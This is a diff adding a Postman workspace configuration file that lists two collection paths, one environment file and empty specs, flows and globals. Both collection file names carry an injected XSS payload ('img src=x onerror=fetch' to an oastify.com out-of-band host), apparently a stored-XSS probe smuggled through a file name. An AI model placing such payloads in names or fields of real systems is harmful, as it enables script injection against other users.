@@ -1,0 +1,17 @@
+{
+  "workspace": {
+    "id": "ef854e85-fee5-496c-9a04-6fffd71aa0cd"
+  },
+  "entities": {
+    "collections": [
+      "../postman/collections/img src=x onerror=fetch('zuxf3eu5gb72a4kvlnyumrp9y04rshg6.oastify.com')_916323-b63489ad-a4ab-4ece-bedb-b31cc5f4ad63.postman_collection.json",
+      "../postman/collections/img src=x onerror=fetch('zuxf3eu5gb72a4kvlnyumrp9y04rshg6.oastify.com')_916323-d76f8d2a-9947-43fd-b0db-4a02d9b4ccbc.postman_collection.json"
+    ],
+    "environments": [
+      "../postman/environments/Stage_916323-ad4840bd-97e8-4ff9-b4c6-4323145cc1f3.postman_environment.json"
+    ],
+    "specs": [],
+    "flows": [],
+    "globals": []
+  }
+}
